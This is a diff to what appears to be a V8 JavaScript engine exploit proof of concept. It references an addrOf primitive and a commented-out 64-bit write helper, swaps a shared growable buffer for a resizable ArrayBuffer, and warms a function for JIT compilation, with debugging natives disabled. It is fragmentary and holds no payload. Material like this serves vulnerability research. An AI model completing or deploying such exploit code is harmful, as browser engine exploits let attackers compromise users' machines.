@@ -17,13 +17,17 @@ function addrOf(obj) {
 
 
 
-const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242});
-const u16arr = new Uint16Array(gsab,0x10);
+// const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242}); // gsab
+// const u16arr = new Uint16Array(gsab,0x10);
+
+const rab = new ArrayBuffer(16, {maxByteLength: 1024});
+const u16arr = new Uint16Array(rab);
+
 u16arr[1] = 0x2;
 // console.log(u16arr[1]);
 
 function foo(obj,index, val) {
-    obj[index] += val + 0x1337;
+    obj[index] += val;
     return obj[index];
 
 }
@@ -45,11 +49,11 @@ for (var i = 0; i < 0x10000; ++i) {
 // let target = Number(0x20000000000n);
 // v8_write64(addrOf(u16arr)+0x19,0x2e00000n);
 
-%DebugPrint(gsab);
-%DebugPrint(u16arr);
+// %DebugPrint(gsab);
+// %DebugPrint(u16arr);
 // %DebugPrint(u16arr);
 // %DebugPrint(target);
 
-%SystemBreak();
+//%SystemBreak();
 
-test(0x2000000,0);
+test(2,0);
